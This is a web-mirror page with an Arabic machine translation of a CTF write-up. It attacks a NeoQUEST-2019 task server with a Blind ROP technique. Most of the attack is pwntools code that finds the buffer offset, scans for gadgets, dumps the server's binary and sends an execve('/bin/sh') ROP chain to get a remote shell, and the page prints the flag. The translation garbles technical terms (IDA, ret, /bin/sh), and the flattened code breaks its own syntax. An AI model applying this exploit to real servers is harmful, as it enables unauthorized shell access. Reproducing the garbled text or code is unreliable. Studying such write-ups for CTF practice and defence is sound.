<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🍜 ⏲️ 🥄 الخادم ، هل يمكنك سماعي؟ هجوم BROP على مثال مهمة NeoQUEST-2019 🔫 🍠 👂🏽</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="كيفية العثور على ثغرة أمنية في الخادم دون معلومات عنها؟ كيف يختلف BROP عن ROP؟ هل من الممكن تنزيل ملف قابل للتنفيذ من خادم من خلال تجاوز سعة المخزن ال...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>الخادم ، هل يمكنك سماعي؟ هجوم BROP على مثال مهمة NeoQUEST-2019</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/neobit/blog/446942/" style=";text-align:right;direction:rtl"><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/d0/f6/ha/d0f6hadxvanaec185oy2mrhds9g.jpeg"></div><br><br>  كيفية العثور على ثغرة أمنية في الخادم دون معلومات عنها؟  كيف يختلف BROP عن ROP؟  هل من الممكن تنزيل ملف قابل للتنفيذ من خادم من خلال تجاوز سعة المخزن المؤقت؟  مرحبًا بك في القطة ، سنقوم بتحليل إجابات هذه الأسئلة على مثال اجتياز مهمة <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">NeoQUEST-2019</a> ! <br><a name="habracut"></a><br>  يرد عنوان ومنفذ الخادم: <b>213.170.100.211 10000</b> .  دعنا نحاول الاتصال به: <br><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/kk/vk/hs/kkvkhs9yuyyv3v3wjniyeubciam.png"></div><br>  للوهلة الأولى - لا شيء خاص ، خادم صدى منتظم: يُرجع نفس الشيء الذي أرسلناه نحن إليه. <br><br>  بعد تشغيلها بحجم البيانات المرسلة ، يمكنك ملاحظة أنه مع طول خط طويل بما فيه الكفاية ، لا يقف الخادم وينهي الاتصال: <br><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/tb/w_/o3/tbw_o3nn4-fxbu4qt8tbc9xjgkc.png"></div><br>  هم ، يبدو وكأنه فيض. <br><br>  العثور على طول المخزن المؤقت.  يمكنك ببساطة تكرار القيم ، وزيادة هذه القيم ، حتى نحصل على إخراج غير قياسي من الخادم.  ويمكنك إظهار القليل من البراعة وتسريع العملية باستخدام البحث الثنائي ، والتحقق مما إذا كان الخادم قد تعطل أو لم يسقط بعد الطلب التالي. <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">تحديد طول المخزن المؤقت</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"><code class="java hljs">from pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> threading <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys ADDR = <span class="hljs-string"><span class="hljs-string">"213.170.100.211"</span></span> PORT = <span class="hljs-number"><span class="hljs-number">10000</span></span> <span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">find_offset</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">: start </span></span>= <span class="hljs-number"><span class="hljs-number">0</span></span> end = <span class="hljs-number"><span class="hljs-number">200</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> True: conn = remote(ADDR, PORT) curlen = (start + end) <span class="hljs-comment"><span class="hljs-comment">// 2 print("Testing {}".format(curlen)) payload = b'\xff' * curlen conn.send(payload) time.sleep(0.5) r = conn.recv() payload = b'\xff' * (curlen) conn.send(payload) try: r = conn.recv() start = curlen payload = b'\xff' * (curlen + 1) conn.send(payload) time.sleep(0.5) r = conn.recv() conn.send(payload) try: r = conn.recv() except EOFError: print("\nBuffer length is {}".format(curlen), flush=True) return curlen except EOFError: end = curlen return -1</span></span></code> </pre> <br></div></div><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/gn/me/c6/gnmec6g5vqg2eed5j7rysddlhz0.png"></div><br>  إذاً ، يبلغ طول المخزن المؤقت 136. إذا قمت بإرسال 136 بايت إلى الخادم ، فسنقوم بمسح البايتات الفارغة في نهاية السطر على المكدس والحصول على البيانات التي تليها - القيمة هي 0x400155.  وهذا ، على ما يبدو ، هو عنوان المرسل.  بهذه الطريقة ، يمكننا التحكم في تدفق التنفيذ.  لكن ليس لدينا الملف القابل للتنفيذ بأنفسنا ، ولا نعرف أين يمكن تحديد موقع أدوات ROP التي تسمح لنا بالحصول على القشرة. <br><br>  ما الذي يمكن عمله حيال ذلك؟ <br><br>  هناك تقنية خاصة تسمح لك بحل هذا النوع من المشكلات الخاضعة للتحكم في عنوان المرسل - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Blind Return Oriented Programming</a> .  في الأساس ، BROP هو فحص أعمى للملف القابل للتنفيذ للأدوات الذكية.  نعيد كتابة عنوان المرسل مع بعض العناوين من مقطع النص ، ونضع معاملات الأداة المرغوبة على المكدس ونحلل سلوك البرنامج.  بناءً على التحليل ، يولد افتراض سواء خمننا أم لا.  يتم لعب دور مهم من خلال الأدوات المساعدة الخاصة - <b>إيقاف</b> (لن يؤدي تنفيذه إلى إنهاء البرنامج) <b>والفخ</b> (تنفيذه سيؤدي إلى إنهاء البرنامج).  وبالتالي ، تم العثور في البداية على الأدوات المساعدة ، وبمساعدتهم يتم بالفعل البحث عن الأدوات الضرورية (كقاعدة عامة ، من أجل استدعاء <b>الكتابة</b> والحصول على الملف القابل للتنفيذ). <br><br>  على سبيل المثال ، نريد العثور على أداة ذكية تضع قيمة واحدة من المكدس في السجل <b>وتحتفظ به</b> .  سنقوم بتسجيل العنوان الذي تم اختباره بدلاً من عنوان المرسل من أجل نقل التحكم إليه.  بعد ذلك ، نكتب عنوان الأداة <b>Trap</b> التي وجدناها في وقت سابق ، وخلفها هو عنوان الأداة <b>Stop</b> .  ما يتضح في النهاية: إذا تعطل الخادم (عمل <b>Trap</b> ) ، فستقع الأداة في عنوان الاختبار الحالي ، والذي لا يتطابق مع العنوان المطلوب: فهو لا يزيل عنوان الأداة <b>Trap</b> من المكدس.  إذا <b>توقف عن</b> العمل ، فقد تكون الأداة الحالية هي ما نبحث عنه: لقد أزلت قيمة واحدة من الحزمة.  وبالتالي ، يمكنك البحث عن الأدوات الذكية التي تتوافق مع سلوك معين. <br><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/wv/lg/n5/wvlgn5htlbmneqpwkwx3ukpnwfs.png"></div><br>  ولكن في هذه الحالة ، يمكن تبسيط البحث.  نحن نعرف بالتأكيد أن الخادم يقوم بطباعة لنا بعض القيمة في الرد.  يمكنك محاولة مسح العناوين المختلفة في الملف القابل للتنفيذ ومعرفة ما إذا كنا نصل إلى الرمز الذي يعرض السطر مرة أخرى. <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">اكتشاف الأداة</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="java hljs">lock = threading.Lock() <span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">safe_get_next</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(gen)</span></span></span><span class="hljs-function">: with lock: return </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">next</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(gen)</span></span></span><span class="hljs-function"> def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">find_puts</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(offiter, buffsize, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: offset </span></span>= <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> True: conn = remote(ADDR, PORT) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: offset = safe_get_next(offiter) except StopIteration: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(base + offset) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> offset % <span class="hljs-number"><span class="hljs-number">0x10</span></span> == <span class="hljs-number"><span class="hljs-number">0</span></span>: print(<span class="hljs-string"><span class="hljs-string">"Checking address {:#x}"</span></span>.format(base + offset), flush=True) conn.send(payload) time.sleep(<span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: r = conn.recv() r = r.strip(b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize)[<span class="hljs-number"><span class="hljs-number">3</span></span>:] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">if</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">len</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(r)</span></span></span><span class="hljs-function"> &gt; 0: </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">print</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"Memleak at {:#x}, {} bytes"</span></span></span></span><span class="hljs-function"><span class="hljs-params">.format(base + offset, len(r)</span></span></span><span class="hljs-function">), flush</span></span>=True) except: pass <span class="hljs-keyword"><span class="hljs-keyword">finally</span></span>: conn.close() offset_iter = iter(range(<span class="hljs-number"><span class="hljs-number">0x200</span></span>)) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">for</span></span></span><span class="hljs-function"> _ in </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">range</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">16</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: threading.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Thread</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(target=find_puts, args=(offset_iter, buffer_size, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400100</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">).</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">start</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> time.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sleep</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">1</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span></span></code> </pre> <br></div></div><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/v2/ec/pj/v2ecpjnrxpyfi0q8bmyxcjxuwj8.png"></div><br>  كيف يمكننا الحصول على الملف القابل للتنفيذ باستخدام هذا التسرب؟ <br><br>  نحن نعلم أن الخادم يكتب سطرًا في الرد.  عندما نذهب إلى العنوان <b>0x40016f ، تمتلئ</b> المعلمات من وظيفة الإخراج مع نوع من القمامة.  نظرًا إلى عنوان المرسل ، نظرًا لأننا نتعامل مع ملف قابل للتنفيذ 64 بت ، فإن معلمات الوظائف <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">موجودة</a> في السجلات. <br><br>  ولكن ماذا لو وجدنا أداة من شأنها أن تسمح لنا بالتحكم في محتويات السجلات (وضعها هناك من المكدس)؟  دعونا نحاول العثور عليه باستخدام نفس الأسلوب.  يمكننا وضع أي قيمة على المكدس ، أليس كذلك؟  لذلك ، نحتاج إلى العثور على أداة منبثقة من شأنها أن تضع قيمتنا في السجل المرغوب قبل استدعاء وظيفة الإخراج.  تعيين عنوان بداية ملف ELF ( <b>0x400000</b> ) كعنوان السلسلة.  إذا وجدنا الأداة الصحيحة ، فسيتعين على الخادم طباعة التوقيع <b>7F 45 4C 46</b> استجابةً لذلك. <br><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/vv/y-/po/vvy-podceguh1qf3k2ezoepoy0u.png"></div><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">يستمر البحث في الأداة</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="java hljs"><span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">find_pop</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(offiter, buffsize, puts, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: offset </span></span>= <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> True: conn = remote(ADDR, PORT) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: offset = safe_get_next(offiter) except StopIteration: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> offset % <span class="hljs-number"><span class="hljs-number">0x10</span></span> == <span class="hljs-number"><span class="hljs-number">0</span></span>: print(<span class="hljs-string"><span class="hljs-string">"Checking address {:#x}"</span></span>.format(base + offset), flush=True) payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(base + offset) payload += p64(<span class="hljs-number"><span class="hljs-number">0x400001</span></span>) payload += p64(puts) conn.send(payload) time.sleep(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: r = conn.recv() r = r.strip(b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize)[<span class="hljs-number"><span class="hljs-number">3</span></span>:] <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> b<span class="hljs-string"><span class="hljs-string">'ELF'</span></span> in r: print(<span class="hljs-string"><span class="hljs-string">"Binary leak at at {:#x}"</span></span>.format(base + offset), flush=True) except: pass <span class="hljs-keyword"><span class="hljs-keyword">finally</span></span>: conn.close() offset_iter = iter(range(<span class="hljs-number"><span class="hljs-number">0x200</span></span>)) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">for</span></span></span><span class="hljs-function"> _ in </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">range</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">16</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: threading.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Thread</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(target=find_pop, args=(offset_iter, buffer_size, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x40016f</span></span></span></span><span class="hljs-function"><span class="hljs-params">, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400100</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">).</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">start</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> time.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sleep</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">1</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span></span></code> </pre> <br></div></div><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/k8/po/ba/k8poba10qmh_-ssoas6vajqhfl0.png"></div><br>  باستخدام المجموعة الناتجة من العناوين ، نقوم بضخ الملف القابل للتنفيذ من الخادم. <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">استخراج الملف</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="java hljs"><span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dump</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(buffsize, pop, puts, offset, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: conn </span></span>= remote(ADDR, PORT) payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(pop) payload += p64(base + offset) # what to dump payload += p64(puts) conn.send(payload) time.sleep(<span class="hljs-number"><span class="hljs-number">0.5</span></span>) r = conn.recv() r = r.strip(b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize) conn.close() <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> r[<span class="hljs-number"><span class="hljs-number">3</span></span>:]: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> r[<span class="hljs-number"><span class="hljs-number">3</span></span>:] <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> None</code> </pre> <br></div></div><br>  دعونا نرى ذلك في المؤسسة الدولية للتنمية: <br><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/dn/zf/pf/dnzfpf9byw59lzmq6uxutqfdfgg.png"></div><br>  <b>يقودنا</b> العنوان <b>0x40016f</b> إلى <b>syscall</b> ، <b>ويؤدي 0x40017f</b> إلى <b>pop rsi</b> ؛  <b>تقاعد</b> <br><br>  الآن بعد أن أصبح لديك ملف قابل للتنفيذ في متناول اليد ، يمكنك بناء سلسلة ROP.  وعلاوة على ذلك ، كان الخط <b>/ بن / ش أيضا في ذلك</b> ! <br><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/mp/--/ui/mp--uihjhux5_-xbm9aqcfbclpi.png"></div><br>  نحن نشكل سلسلة تستدعي <b>النظام</b> بحجة <b>/ bin / sh</b> .  يمكن العثور على معلومات حول مكالمات النظام في نظام Linux 64 بت ، على سبيل المثال ، <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">هنا</a> . <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">آخر خطوة صغيرة</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="java hljs"><span class="hljs-function"><span class="hljs-function">def </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">get_shell</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(buffsize, base=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0x400000</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">: conn </span></span>= remote(ADDR, PORT) payload = b<span class="hljs-string"><span class="hljs-string">'A'</span></span> * buffsize payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x17d</span></span>) payload += p64(<span class="hljs-number"><span class="hljs-number">59</span></span>) payload += p64(<span class="hljs-number"><span class="hljs-number">0</span></span>) payload += p64(<span class="hljs-number"><span class="hljs-number">0</span></span>) payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x1ce</span></span>) payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x1d0</span></span>) payload += p64(base + <span class="hljs-number"><span class="hljs-number">0x17b</span></span>) conn.send(payload) conn.interactive()</code> </pre> <br></div></div><br>  تشغيل استغلال والحصول على shell: <br><br><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/vk/bv/vi/vkbvviq-wsbdkmie1iksoiwckim.png"></div><br>  النصر! <br><br>  <b>NQ201934D811DCBD6AA2926218976CB3340DE95902DD0F33E60E4FF32BAD209BBA4433</b> <br><br>  قريبًا ، ستظهر vraytaps للمهام الأخرى للمرحلة عبر الإنترنت من NeoQUEST-2019.  و "المواجهة" ستحدث في 26 يونيو!  سوف تظهر الأخبار على <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">موقع</a> الحدث ، لا تفوت! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar446942/">https://habr.com/ru/post/ar446942/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar446924/index.html">تمثيل كثير الحدود التعسفي في شكل اختلافات محدودة مع خطوة تعسفية</a></li>
<li><a href="../ar446926/index.html">"لذلك أدركت أنني الآن مهندس تاريخ ، وبأسلوب مختلف يمكنك وضع نفسك في السوق"</a></li>
<li><a href="../ar446932/index.html">TDMS فيرواي و BIM</a></li>
<li><a href="../ar446938/index.html">نظام الجسيمات في الرسوم المتحركة الأساسية. قصة عيد الميلاد</a></li>
<li><a href="../ar446940/index.html">ضمان الجودة على همز. لماذا هو بارد</a></li>
<li><a href="../ar446944/index.html">لماذا الاستثمار في الشركات غير المربحة؟</a></li>
<li><a href="../ar446948/index.html">كيف يزيل Android Gustuff Trojan الكريم (fiat و crypto) من حساباتك</a></li>
<li><a href="../ar446950/index.html">76٪ من المصنعين ليس لديهم خبرة في تنفيذ الإضافات - لماذا هذا جيد</a></li>
<li><a href="../ar446952/index.html">إنشاء رسوم بيانية متحركة باستخدام R</a></li>
<li><a href="../ar446956/index.html">إنه ضار للضوء أو كيفية الحفاظ على شحن بطارية السيارة</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>